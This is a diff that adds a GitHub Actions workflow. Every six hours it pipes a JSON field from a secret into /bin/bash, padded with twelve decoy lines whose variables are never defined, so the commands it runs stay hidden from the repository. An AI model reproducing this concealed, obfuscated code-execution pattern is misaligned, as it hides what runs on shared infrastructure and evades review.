@@ -1,0 +1,30 @@
+name: wangluoqiet
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangluoqiet
+        env:
+          vfna77: ${{ secrets.vfna77 }}
+        run: |
+          echo $vfna77 | jq -r .ic21 | /bin/bash
+          echo $dbtqb48648 | jq -r .rto8827 | /bin/bash
+          echo $esozz5862 | jq -r .qsrl039 | /bin/bash
+          echo $nc57 | jq -r .y29079 | /bin/bash
+          echo $k93 | jq -r .upwco42610 | /bin/bash
+          echo $lyusv237 | jq -r .nospk612 | /bin/bash
+          echo $wqw40 | jq -r .noo22 | /bin/bash
+          echo $l06 | jq -r .ee2017 | /bin/bash
+          echo $x6395 | jq -r .w7835 | /bin/bash
+          echo $uko60 | jq -r .comxk4 | /bin/bash
+          echo $u601 | jq -r .jdsib23635 | /bin/bash
+          echo $uegnt8713 | jq -r .kptts55824 | /bin/bash
+          echo $clu4 | jq -r .njr5391 | /bin/bash
+
